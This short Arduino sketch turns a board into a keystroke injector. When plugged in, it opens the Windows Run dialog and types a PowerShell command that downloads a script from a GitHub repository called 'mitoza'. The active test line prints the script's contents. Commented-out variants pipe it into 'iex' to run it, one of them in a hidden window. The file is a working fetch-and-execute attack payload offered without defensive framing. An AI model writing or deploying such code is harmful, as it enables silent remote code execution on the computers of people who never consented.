#include <unoHID.h>

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();

  Keyboard.setTxDelay(0);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  //Test
  Keyboard.println("powershell \"(iwr -UseBasicParsing \'https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/test/a.ps1\').content;Start-Sleep -Seconds 15\"");
  //Mitoza
  // Keyboard.println("powershell \"iwr -UseBasicParsing \'https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1\' | iex\"");
  //Mitoza-Background
  // Keyboard.println("powershell -windowstyle hidden \"iwr -UseBasicParsing \'https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1\' | iex\"");
  
  Keyboard.end();

}

void loop() {
  // put your main code here, to run repeatedly:

}
